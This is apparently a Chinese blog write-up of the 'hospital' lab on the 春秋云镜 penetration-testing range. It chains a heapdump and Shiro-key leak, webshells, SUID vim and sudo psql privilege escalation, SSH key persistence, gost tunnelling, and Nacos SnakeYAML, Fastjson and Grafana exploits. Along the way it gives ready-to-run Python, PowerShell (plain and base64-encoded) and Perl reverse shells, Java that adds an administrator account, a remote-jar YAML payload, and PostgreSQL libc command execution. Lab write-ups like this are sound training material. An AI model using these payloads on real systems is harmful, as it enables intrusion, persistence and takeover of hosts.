---
title: "春秋云镜 hospital"
onlyTitle: true
date: 2025-8-7 23:18:18
categories:
- 渗透
- 春秋云镜
tags:
- 春秋云镜
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8166.jpg
---




## hospital

fscan

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810111216365.png)

8080 web端口，actuator泄露heapdump

访问actuator路由，下载heapdump文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810111856493.png)

用JDumpSpider提取信息https://github.com/whwlsfb/JDumpSpider

Cookie解码出Shiro key GAYysgMQhG7/CzIJlVpR2g==

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810112048757.png)

直接注哥斯拉马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810113700921.png)

没找到flag，一般都在root下，需要提权

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810113935245.png)

查看suid命令：

```sh
find / -user root -perm -4000 -print 2>/dev/null
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810114714637.png)

能用的似乎只有vim.basic，其他都是需要身份认证的命令

冰蝎的webshell不是交互式的，不能用vim提权，先python弹回shell（花生壳映射）

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("115.236.153.170",54371));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810121006859.png)

然后转交互式shell：

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

列目录：

```sh
vim.basic /root
```

依次读到/root/flag/flag01.txt

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810121417339.png)

flag01: flag{eb8a809f-667e-49dd-9927-9143cc7d4a51}

利用vim支持python3脚本的特性，可以vim->python shell的方式进行提权

```sh
/usr/bin/vim.basic  -c ':python3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

这里可以一口气直接打通，不过学习一下写ssh

直接xshell生成ssh公私钥，把公钥写到ssh认证目录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810123425188.png)

（直接webshell管理工具上传文件）

将公钥写入root ssh认证目录：

```sh
cat id_rsa_4096.pub >> /root/.ssh/authorized_keys
```

这样就能直接无密码连接上root了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810123833528.png)

还能直接一键启xftp传文件，丝滑、传个fscan扫一下：

```sh
./FScan_linux_x64 -h 172.30.12.5/24
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810132304323.png)

为啥我这个fscan是个史，没扫出nacos，只找到http://172.30.12.6:8848 

http://172.30.12.236:8080

先直接一个gost代理出来

Server：

```sh
./gost -L socks5://:5555?bind=true
```

主机：

```sh
gost -L rtcp://:2222/39.98.118.215:22 -F socks5://39.98.118.215:5555
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810134628343.png)

配proxifier

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810134737714.png)

然后就能访问内网服务了，虽然404，不过偷看别人的wp知道这个主机是nacos服务，直接访问nacos路由

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810134805043.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810135023811.png)

直接上工具！

https://github.com/charonlight/NacosExploitGUI

存在很多漏洞，先弱口令nacos,nacos登录

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810135358751.png)

登上去看到db-config的nacos配置

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810135559711.png)

nacos存在snakeYaml反序列化，用SPI机制远程请求Jar包触发MF->类加载的漏洞

直接下载这个source包

https://github.com/charonlight/NacosExploitGUI/archive/refs/tags/v7.0.zip

找到yaml-payload模块

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810140856906.png)

修改AwesomeScriptEngineFactory()

```java
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("net user godown godown@123 /add");
            Runtime.getRuntime().exec("net localgroup administrators godown /add");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

原理：https://godownio.github.io/2024/10/28/snakeyaml/#ScriptEngineManager

然后点击生成jar.bat

生成的yaml-payload.jar上传到web1，在web1上开Http服务，让web2 nacos的机器可以访问

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250810141229988.png)

但我rdp弹不出来，用hacktools的powershell反弹shell，Nacos工具也不需要，直接手动编辑配置改成poc发布。

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.30.12.5',8787);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```sh
cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxNzIuMzAuMTIuNScsODc4Nyk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSI=
```

```java
    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode("cG93ZXJzaGVsbCAtbm9wIC1jICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCcxNzIuMzAuMTIuNScsODc4Nyk7JHN0cmVhbSA9ICRjbGllbnQuR2V0U3RyZWFtKCk7W2J5dGVbXV0kYnl0ZXMgPSAwLi42NTUzNXwlezB9O3doaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCl7OyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzskc2VuZGJ5dGUgPSAoW3RleHQuZW5jb2RpbmddOjpBU0NJSSkuR2V0Qnl0ZXMoJHNlbmRiYWNrMik7JHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKTskc3RyZWFtLkZsdXNoKCl9OyRjbGllbnQuQ2xvc2UoKSI=")));
//            Runtime.getRuntime().exec("net localgroup administrators godown /add");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

web1开监听

nc -lvnp 8787

```java
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://172.30.12.5:8888/yaml-payload.jar"]
  ]]
]
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812204023861.png)

flag02: flag{bb6ec54b-1de7-4679-b5cb-a3f9e918d8b8}



然后是http://172.30.12.236:8080

还没用到，题目给了fastjson提示，抓包发现login路由是以json形式登录的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812210209812.png)

直接打，给了报错是Tomcat8，能打dhcp回显，bp插件https://github.com/amaz1ngday/fastjson-exp

打fastjsoninject注入哥斯拉马

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812210540424.png)

找到flag03

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812210653596.png)

且web权限就是root，好耶，不用提权了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812210845219.png)

ifconfig发现双网卡，网段分别为172.30.12.236/24和172.30.54.179/24

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812210923030.png)

如法炮制，在web1开http开放ssh公钥，让web3 wget下载，然后写入/root/.ssh/authorized_keys路径，这样方便xshell连接

```sh
wget http://172.30.12.5:8888/id_rsa_4096.pub
cat id_rsa_4096.pub >> /root/.ssh/authorized_keys
```

然后也是连上了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812211652501.png)

传fscan上去扫下172.30.54.179/24网段

```sh
./FScan_linux_x64 -h 172.30.54.179/24
```

直接就是扫出一个172.30.54.12:3000/login，为Grafana

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812211901065.png)

接着还得内网穿透，因为访问不了172.30.54.12:3000/login的服务，让web3穿到web1，然后profixier配个代理链

```sh
web3:
./gost -L socks5://:5555?bind=true

web1:
./gost -L rtcp://:2222/172.30.12.236:22 -F socks5://172.30.12.236:5555
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812213249582.png)

记得代理规则选到你的chain

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812213307006.png)

于是能访问辣

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812213327364.png)

妈个鸡，开个代理除了这个其他啥也访问不了，一开一关的，玩寸止呢

上工具https://github.com/A-D-Team/grafanaExp

```sh
./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812214215435.png)

数据库 postgres 帐号密码 postgres / Postgres@123

额不知道为什么我的密码是乱码，不管了，好像工具是1.1才行？我传的1.5。。。不过现实应该不会出现这种问题，这里跳过

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812215713908.png)

后面的postgresql提权不会，照着打

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812221157733.png)

在web3上起个nc监听，web4上执行下列命令

依次为修改root密码，创建命令执行函数，perl反弹shell。

```sh
ALTER USER root WITH PASSWORD '123456';
CREATE OR REPLACE FUNCTION system (cstring) RETURNS integer AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
select system('perl -e \'use Socket;$i="172.30.54.179";$p=8787;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'');
```

其中libc.so.6的文件路径只能靠猜，一般为如下路径：

```sh
/lib/x86_64-linux-gnu/libc.so.6
/lib/libc.so.6
/lib64/libc.so.6
/usr/lib/x86_64-linux-gnu/libc.so.6
/usr/lib32/libc.so.6
```

弹回shell

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812220351505.png)

转交互式shell

```rust
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

whoami一下看到为postgres用户

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812220552978.png)

sudo -l找到psql位置

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812220646323.png)

psql提权

```text
sudo /usr/local/postgresql/bin/psql
```

密码为之前改的123456

接着依次输入

```sh
\?
!/bin/bash
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812221122975.png)

拿到root权限

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250812221049994.png)

flag04: flag{bfcd58d8-cc12-4ae4-9879-728a04beea05}
